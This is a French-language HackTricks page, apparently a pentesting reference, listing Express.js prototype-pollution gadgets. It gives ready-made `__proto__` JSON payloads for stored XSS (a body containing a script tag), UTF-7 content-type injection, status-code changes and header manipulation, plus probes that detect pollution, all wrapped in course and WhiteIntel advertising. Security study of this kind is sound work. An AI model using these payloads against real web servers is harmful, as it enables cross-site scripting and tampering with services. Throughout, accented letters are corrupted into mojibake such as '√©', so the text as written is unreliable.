# Gadgets de Pollution de Prototype Express

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur **gratuitement** sur :

{% embed url="https://whiteintel.io" %}

---

## Servir des r√©ponses XSS

**Pour plus de d√©tails [consultez la recherche originale](https://portswigger.net/research/server-side-prototype-pollution)**

### Changer le type de contenu JSON en HTML

Dans une application Express utilisant une r√©ponse de type de contenu **JSON** et refl√©tant un JSON :
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Dans ces cas, XSS n'est g√©n√©ralement pas possible avec un type de contenu JSON. Cependant, avec la pollution de prototype, nous pouvons **confondre Express pour servir une r√©ponse HTML.** Cette vuln√©rabilit√© repose sur l'application utilisant **`res.send(obj)`** et utilisant le body parser avec le type de contenu application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
En **polluant** les propri√©t√©s **`body`** et **`_body`**, il est possible de faire en sorte qu'**Express serve le type de contenu HTML** et refl√®te la propri√©t√© `_body`, ce qui entra√Æne une XSS stock√©e.

### Rendu UTF7

Il est possible de faire en sorte qu'express **rende le contenu UTF-7 avec**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Techniques de num√©risation s√©curitaires

### Espaces JSON

Le PP suivant ajoutera un espace suppl√©mentaire aux attributs √† l'int√©rieur d'un JSON sans compromettre la fonctionnalit√© :
```json
{"__proto__":{"json spaces": " "}}
```
Ensuite, un JSON r√©fl√©chi ressemblera √† :
```json
{"foo":  "bar"} -- Note the extra space
```
### En-t√™tes Expos√©s

Le gadget PP suivant fera en sorte que le serveur renvoie l'en-t√™te HTTP : **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Il est n√©cessaire d'avoir le module **CORS install√©**

### **M√©thode OPTIONS**

Avec la charge utile suivante, il est possible de **cacher une m√©thode d'une r√©ponse OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Statut**

Il est possible de changer le **code de statut retourn√©** en utilisant la charge utile PP suivante :
```json
{"__proto__":{"status":510}}
```
### Erreur

Lorsque vous attribuez √† un prototype une valeur primitive telle qu'une cha√Æne de caract√®res, cela produit une **op√©ration no-op car le prototype doit √™tre un objet**. Si vous essayez d'attribuer un objet prototype √† `Object.prototype` lui-m√™me, cela va **lever une exception**. Nous pouvons utiliser ces deux comportements pour **d√©tecter si la pollution du prototype a r√©ussi** :
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valeur r√©fl√©chie

Lorsqu'une application inclut un objet dans sa r√©ponse, la cr√©ation d'un attribut avec un **nom inhabituel aux c√¥t√©s de `__proto__`** peut √™tre instructive. En particulier, si **seul l'attribut inhabituel est renvoy√©** dans la r√©ponse, cela pourrait indiquer la vuln√©rabilit√© de l'application :
```json
{"unusualName":"value","__proto__":"test"}
```
De plus, dans les sc√©narios o√π une biblioth√®que comme Lodash est utilis√©e, d√©finir une propri√©t√© √† la fois via la pollution de prototype (PP) et directement √† l'int√©rieur de l'objet offre une autre approche diagnostique. Si une telle propri√©t√© est omise de la r√©ponse, cela sugg√®re que Lodash v√©rifie l'existence de la propri√©t√© dans l'objet cible avant la fusion :
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Divers

### Autoriser les points

Il existe une option dans Express qui vous permet de **cr√©er des objets √† partir des param√®tres de la cha√Æne de requ√™te**.\
Vous pourriez certainement l'utiliser dans une **cha√Æne** de bugs pour exploiter une **vuln√©rabilit√© de pollution de prototype**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cr√©e un objet dans Node.**

## R√©f√©rences

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) est un moteur de recherche aliment√© par le **dark web** qui offre des fonctionnalit√©s **gratuites** pour v√©rifier si une entreprise ou ses clients ont √©t√© **compromis** par des **logiciels malveillants voleurs**.

Le but principal de WhiteIntel est de lutter contre les prises de contr√¥le de compte et les attaques de ransomware r√©sultant de logiciels malveillants volant des informations.

Vous pouvez consulter leur site Web et essayer leur moteur gratuitement sur :

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
